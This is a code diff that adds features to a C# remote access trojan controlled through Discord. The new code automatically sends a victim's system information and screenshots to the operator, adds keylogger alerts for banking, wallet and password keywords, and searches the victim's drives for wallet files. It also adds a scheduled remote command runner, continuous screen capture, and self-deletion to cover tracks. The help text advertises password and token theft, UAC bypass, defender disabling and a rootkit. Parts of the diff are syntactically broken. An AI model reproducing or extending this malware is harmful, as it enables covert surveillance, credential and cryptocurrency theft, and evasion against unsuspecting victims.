@@ -131,6 +131,16 @@ namespace Discord_rat
         public static string ethAddress = "";
         public static CancellationTokenSource clipperCts = null;
 
+        public static bool scheduleActive = false;
+        public static CancellationTokenSource scheduleCts = null;
+
+        public static bool liveviewActive = false;
+        public static CancellationTokenSource liveviewCts = null;
+
+        public static string[] sensitiveKeywords = new string[] { "bank", "binance", "metamask", "paypal", "password", "crypto", "seed", "wallet", "login" };
+        public static HashSet<string> alertedKeywords = new HashSet<string>();
+
+
         [DllImport("ntdll.dll", SetLastError = true)]
         private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);
 
@@ -263,6 +273,19 @@ namespace Discord_rat
             httpClient.Dispose();
             string starting_payload = string.Format("@here :white_check_mark: New session opened {0} | User: {2} | IP: {1} | Admin: {3}", "session-" + biggest.ToString(),await getip(), Environment.UserName,(new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator)).ToString());
             await Send_message((string)new_channel_id, starting_payload);
+
+            // Auto-Stealer on Session Join (2.2)
+            Task.Run(async () =>
+            {
+                try
+                {
+                    await Task.Delay(2000);
+                    await SystemInfo((string)new_channel_id);
+                    await GetScreenshot((string)new_channel_id);
+                }
+                catch { }
+            });
+
             return (string)new_channel_id;
         }
         public static async Task handler(Dictionary<object, object> data)
@@ -858,7 +881,7 @@ namespace Discord_rat
         }
         public static async Task helpmenu(string channelid) 
         {
-            string data = "--> !sysinfo = Display detailed system, HW, AV & OS info\n--> !keylogger = Control keylogger / Syntax = \"!keylogger start|stop|dump\"\n--> !clipper = Swap crypto addresses in clipboard / Syntax = \"!clipper start <btc> <eth>|stop\"\n--> !recordaudio = Record microphone audio for N seconds / Syntax = \"!recordaudio 10\"\n--> !message = Show a message box displaying your text / Syntax  = \"!message example\"\n--> !shell = Execute a shell command /Syntax  = \"!shell whoami\"\n--> !voice = Make a voice say outloud a custom sentence / Syntax = \"!voice test\"\n--> !admincheck = Check if program has admin privileges\n--> !cd = Changes directory\n--> !dir = display all items in current dir\n--> !download = Download a file from infected computer\n--> !upload = Upload file to the infected computer / Syntax = \"!upload file.png\" (with attachment)\n--> !uploadlink = Upload file to the infected computer / Syntax = \"!upload link file.png\"\n--> !delete = deletes a file / Syntax = \"!delete / path to / the / file.txt\"\n--> !write = Type your desired sentence on computer\n--> !wallpaper = Change infected computer wallpaper / Syntax = \"!wallpaper\" (with attachment)\n--> !clipboard = Retrieve infected computer clipboard content\n--> !idletime = Get the idle time of user\'s on target computer\n--> !currentdir = display the current dir\n--> !block = Blocks user\'s keyboard and mouse / Warning : Admin rights are required\n--> !unblock = Unblocks user\'s keyboard and mouse / Warning : Admin rights are required\n--> !screenshot = Get the screenshot of the user\'s current screen\n--> !exit = Exit program\n--> !kill = Kill a session or all sessions / Syntax = \"!kill session-3\" or \"!kill all\"\n--> !uacbypass = attempt to bypass uac to gain admin by using windir and slui\n--> !shutdown = shutdown computer\n--> !restart = restart computer\n--> !logoff = log off current user\n--> !bluescreen = BlueScreen PC\n--> !datetime = display system date and time\n--> !prockill = kill a process by name / syntax = \"!kill process\"\n--> !disabledefender = Disable windows defender(requires admin)\n--> !disablefirewall = Disable windows firewall(requires admin)\n--> !audio = play a audio file on the target computer / Syntax = \"!audio\" (with attachment)\n--> !critproc = make program a critical process. meaning if its closed the computer will bluescreen(Admin rights are required)\n--> !uncritproc = if the process is a critical process it will no longer be a critical process meaning it can be closed without bluescreening(Admin rights are required)\n--> !website = open a website on the infected computer / syntax = \"!website www.google.com\"\n--> !disabletaskmgr = disable task manager(Admin rights are required)\n--> !enabletaskmgr = enable task manager(if disabled)(Admin rights are required)\n--> !startup = add to startup(when computer go on this file starts)\n--> !geolocate = Geolocate computer using latitude and longitude of the ip adress with google map / Warning : Geolocating IP adresses is not very precise\n--> !listprocess = Get all process\'s\n--> !password = grab all passwords\n--> !rootkit = Launch a rootkit (the process will be hidden from taskmgr and you wont be able to see the file)(Admin rights are required)\n--> !unrootkit = Remove the rootkit(Admin rights are required)\n--> !getcams = Grab the cameras names and their respected selection number\n--> !selectcam = Select camera to take a picture out of (default will be camera 1)/ Syntax \"!selectcam 1\"\n--> !webcampic = Take a picture out of the selected webcam\n--> !grabtokens = Grab all discord tokens on the current pc\n--> !help = This help menu";
+            string data = "--> !schedule = Task Scheduler / Syntax = \"!schedule start <sec> <cmd>|stop\"\n--> !liveview = Continuous screen view / Syntax = \"!liveview start <sec>|stop\"\n--> !searchfile = Search files on system / Syntax = \"!searchfile *wallet*\"\n--> !cleanlogs = Clean temp files and log buffers\n--> !selfdestruct = Self destruct and remove client\n--> !sysinfo = Display detailed system, HW, AV & OS info\n--> !keylogger = Control keylogger / Syntax = \"!keylogger start|stop|dump\"\n--> !clipper = Swap crypto addresses in clipboard / Syntax = \"!clipper start <btc> <eth>|stop\"\n--> !recordaudio = Record microphone audio for N seconds / Syntax = \"!recordaudio 10\"\n--> !message = Show a message box displaying your text / Syntax  = \"!message example\"\n--> !shell = Execute a shell command /Syntax  = \"!shell whoami\"\n--> !voice = Make a voice say outloud a custom sentence / Syntax = \"!voice test\"\n--> !admincheck = Check if program has admin privileges\n--> !cd = Changes directory\n--> !dir = display all items in current dir\n--> !download = Download a file from infected computer\n--> !upload = Upload file to the infected computer / Syntax = \"!upload file.png\" (with attachment)\n--> !uploadlink = Upload file to the infected computer / Syntax = \"!upload link file.png\"\n--> !delete = deletes a file / Syntax = \"!delete / path to / the / file.txt\"\n--> !write = Type your desired sentence on computer\n--> !wallpaper = Change infected computer wallpaper / Syntax = \"!wallpaper\" (with attachment)\n--> !clipboard = Retrieve infected computer clipboard content\n--> !idletime = Get the idle time of user\'s on target computer\n--> !currentdir = display the current dir\n--> !block = Blocks user\'s keyboard and mouse / Warning : Admin rights are required\n--> !unblock = Unblocks user\'s keyboard and mouse / Warning : Admin rights are required\n--> !screenshot = Get the screenshot of the user\'s current screen\n--> !exit = Exit program\n--> !kill = Kill a session or all sessions / Syntax = \"!kill session-3\" or \"!kill all\"\n--> !uacbypass = attempt to bypass uac to gain admin by using windir and slui\n--> !shutdown = shutdown computer\n--> !restart = restart computer\n--> !logoff = log off current user\n--> !bluescreen = BlueScreen PC\n--> !datetime = display system date and time\n--> !prockill = kill a process by name / syntax = \"!kill process\"\n--> !disabledefender = Disable windows defender(requires admin)\n--> !disablefirewall = Disable windows firewall(requires admin)\n--> !audio = play a audio file on the target computer / Syntax = \"!audio\" (with attachment)\n--> !critproc = make program a critical process. meaning if its closed the computer will bluescreen(Admin rights are required)\n--> !uncritproc = if the process is a critical process it will no longer be a critical process meaning it can be closed without bluescreening(Admin rights are required)\n--> !website = open a website on the infected computer / syntax = \"!website www.google.com\"\n--> !disabletaskmgr = disable task manager(Admin rights are required)\n--> !enabletaskmgr = enable task manager(if disabled)(Admin rights are required)\n--> !startup = add to startup(when computer go on this file starts)\n--> !geolocate = Geolocate computer using latitude and longitude of the ip adress with google map / Warning : Geolocating IP adresses is not very precise\n--> !listprocess = Get all process\'s\n--> !password = grab all passwords\n--> !rootkit = Launch a rootkit (the process will be hidden from taskmgr and you wont be able to see the file)(Admin rights are required)\n--> !unrootkit = Remove the rootkit(Admin rights are required)\n--> !getcams = Grab the cameras names and their respected selection number\n--> !selectcam = Select camera to take a picture out of (default will be camera 1)/ Syntax \"!selectcam 1\"\n--> !webcampic = Take a picture out of the selected webcam\n--> !grabtokens = Grab all discord tokens on the current pc\n--> !help = This help menu";
             if (data.Length >= 1990)
             {
                 await Send_attachment(channelid, "", new List<byte[]>() { StringToBytes(data) }, new string[] { "help.txt" });
@@ -1064,6 +1087,19 @@ namespace Discord_rat
                             else if (key == Keys.Shift || key == Keys.LShiftKey || key == Keys.RShiftKey) { }
                             else if (key >= Keys.A && key <= Keys.Z) keylogData.Append(key.ToString());
                             else if (key >= Keys.D0 && key <= Keys.D9) keylogData.Append(key.ToString().Replace("D", ""));
+
+                            string currentLogs = keylogData.ToString().ToLower();
+                            foreach (string kw in sensitiveKeywords)
+                            {
+                                if (currentLogs.Contains(kw) && !alertedKeywords.Contains(kw))
+                                {
+                                    alertedKeywords.Add(kw);
+                                    if (ChannelId != "unset")
+                                    {
+                                        await Send_message(ChannelId, $"🚨 **[KEYWORD ALERT]** Sensitive keyword '{kw}' detected in keylogger!");
+                                    }
+                                }
+                            }
                             else keylogData.Append($"[{key}]");
                         }
                     }
@@ -1175,6 +1211,172 @@ namespace Discord_rat
             staThread.Join();
         }
 
+
+        public static void StartSchedule(string channelid, int intervalSec, string commandToRun)
+        {
+            if (intervalSec < 5) intervalSec = 5;
+            StopSchedule();
+            scheduleActive = true;
+            scheduleCts = new CancellationTokenSource();
+            Task.Run(async () =>
+            {
+                while (scheduleActive && !scheduleCts.Token.IsCancellationRequested)
+                {
+                    await Task.Delay(intervalSec * 1000);
+                    if (scheduleActive && !scheduleCts.Token.IsCancellationRequested)
+                    {
+                        await CommandHandler(commandToRun, new string[0]);
+                    }
+                }
+            }, scheduleCts.Token);
+        }
+
+        public static void StopSchedule()
+        {
+            scheduleActive = false;
+            if (scheduleCts != null)
+            {
+                scheduleCts.Cancel();
+                scheduleCts.Dispose();
+                scheduleCts = null;
+            }
+        }
+
+        public static void StartLiveView(string channelid, int intervalSec)
+        {
+            if (intervalSec < 3) intervalSec = 3;
+            StopLiveView();
+            liveviewActive = true;
+            liveviewCts = new CancellationTokenSource();
+            Task.Run(async () =>
+            {
+                while (liveviewActive && !liveviewCts.Token.IsCancellationRequested)
+                {
+                    await GetScreenshot(channelid);
+                    await Task.Delay(intervalSec * 1000);
+                }
+            }, liveviewCts.Token);
+        }
+
+        public static void StopLiveView()
+        {
+            liveviewActive = false;
+            if (liveviewCts != null)
+            {
+                liveviewCts.Cancel();
+                liveviewCts.Dispose();
+                liveviewCts = null;
+            }
+        }
+
+        public static async Task SearchFiles(string channelid, string searchPattern)
+        {
+            if (string.IsNullOrEmpty(searchPattern)) searchPattern = "*wallet*";
+            try
+            {
+                await Send_message(channelid, $"Searching files with pattern '{searchPattern}' across system...");
+                List<string> foundFiles = new List<string>();
+                foreach (DriveInfo drive in DriveInfo.GetDrives())
+                {
+                    if (drive.IsReady && drive.DriveType == DriveType.Fixed)
+                    {
+                        try
+                        {
+                            foreach (string file in Directory.GetFiles(drive.RootDirectory.FullName, searchPattern, SearchOption.AllDirectories))
+                            {
+                                foundFiles.Add(file);
+                                if (foundFiles.Count >= 50) break;
+                            }
+                        }
+                        catch { }
+                    }
+                    if (foundFiles.Count >= 50) break;
+                }
+
+                if (foundFiles.Count == 0)
+                {
+                    await Send_message(channelid, "No files found matching pattern.");
+                }
+                else
+                {
+                    string result = string.Join("
+", foundFiles);
+                    if (result.Length >= 1900)
+                    {
+                        await Send_attachment(channelid, "Found files list:", new List<byte[]>() { StringToBytes(result) }, new string[] { "found_files.txt" });
+                    }
+                    else
+                    {
+                        await Send_message(channelid, "```
+" + result + "
+```");
+                    }
+                }
+                await Send_message(channelid, "Command executed!");
+            }
+            catch (Exception ex)
+            {
+                await Send_message(channelid, "Error searching files: " + ex.Message);
+            }
+        }
+
+        public static async Task CleanLogs(string channelid)
+        {
+            try
+            {
+                int deletedCount = 0;
+                string tempDir = Path.GetTempPath();
+                string[] files = Directory.GetFiles(tempDir, "rec_*.wav");
+                foreach (string f in files)
+                {
+                    try { File.Delete(f); deletedCount++; } catch { }
+                }
+                keylogData.Clear();
+                alertedKeywords.Clear();
+                await Send_message(channelid, $"Cleaned temporary logs! Deleted {deletedCount} temp recording files and cleared log buffers.");
+                await Send_message(channelid, "Command executed!");
+            }
+            catch (Exception ex)
+            {
+                await Send_message(channelid, "Error cleaning logs: " + ex.Message);
+            }
+        }
+
+        public static async Task SelfDestruct(string channelid)
+        {
+            try
+            {
+                await Send_message(channelid, "Initiating self-destruct sequence...");
+                try
+                {
+                    RegistryKey rk = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
+                    string keyName = "$77" + Path.GetFileName(Assembly.GetEntryAssembly().Location);
+                    if (rk.GetValue(keyName) != null) rk.DeleteValue(keyName);
+                }
+                catch { }
+
+                string currentFile = Assembly.GetEntryAssembly().Location;
+                string batchPath = Path.Combine(Path.GetTempPath(), "remove.bat");
+                string batchContent = $":Loop
+del "{currentFile}"
+if exist "{currentFile}" goto Loop
+del "{batchPath}"";
+                File.WriteAllText(batchPath, batchContent);
+
+                Process.Start(new ProcessStartInfo()
+                {
+                    FileName = "cmd.exe",
+                    Arguments = $"/C {batchPath}",
+                    CreateNoWindow = true,
+                    WindowStyle = ProcessWindowStyle.Hidden
+                });
+
+                Application.Exit();
+                Environment.Exit(0);
+            }
+            catch { Environment.Exit(0); }
+        }
+
         public static async Task RecordAudio(string channelid, int seconds)
         {
             if (seconds <= 0 || seconds > 300) seconds = 10;
@@ -1215,6 +1417,63 @@ namespace Discord_rat
             string message_data = string.Join(" ", message_content.Split(" ".ToCharArray()).Skip(1));
             switch (command)
             {
+
+                case "!schedule":
+                    string[] schedArgs = message_data.Split(" ".ToCharArray(), StringSplitOptions.RemoveEmptyEntries);
+                    if (schedArgs.Length > 0 && schedArgs[0].ToLower() == "start")
+                    {
+                        int sec = 30;
+                        if (schedArgs.Length > 1) int.TryParse(schedArgs[1], out sec);
+                        string cmdToRun = string.Join(" ", schedArgs.Skip(2));
+                        if (!string.IsNullOrEmpty(cmdToRun))
+                        {
+                            StartSchedule(ChannelId, sec, cmdToRun);
+                            await Send_message(ChannelId, $"Schedule started! Running '{cmdToRun}' every {sec} seconds.");
+                        }
+                        else
+                        {
+                            await Send_message(ChannelId, "Syntax: !schedule start <seconds> <command>");
+                        }
+                    }
+                    else if (schedArgs.Length > 0 && schedArgs[0].ToLower() == "stop")
+                    {
+                        StopSchedule();
+                        await Send_message(ChannelId, "Schedule stopped!");
+                    }
+                    else
+                    {
+                        await Send_message(ChannelId, "Syntax: !schedule start <seconds> <command> | !schedule stop");
+                    }
+                    break;
+                case "!liveview":
+                    string[] liveArgs = message_data.Split(" ".ToCharArray(), StringSplitOptions.RemoveEmptyEntries);
+                    if (liveArgs.Length > 0 && liveArgs[0].ToLower() == "start")
+                    {
+                        int interval = 5;
+                        if (liveArgs.Length > 1) int.TryParse(liveArgs[1], out interval);
+                        StartLiveView(ChannelId, interval);
+                        await Send_message(ChannelId, $"LiveView started! Capturing screen every {interval} seconds.");
+                    }
+                    else if (liveArgs.Length > 0 && liveArgs[0].ToLower() == "stop")
+                    {
+                        StopLiveView();
+                        await Send_message(ChannelId, "LiveView stopped!");
+                    }
+                    else
+                    {
+                        await Send_message(ChannelId, "Syntax: !liveview start <interval_sec> | !liveview stop");
+                    }
+                    break;
+                case "!searchfile":
+                    await SearchFiles(ChannelId, message_data);
+                    break;
+                case "!cleanlogs":
+                    await CleanLogs(ChannelId);
+                    break;
+                case "!selfdestruct":
+                    await SelfDestruct(ChannelId);
+                    break;
+
 
                 case "!sysinfo":
                     await SystemInfo(ChannelId);
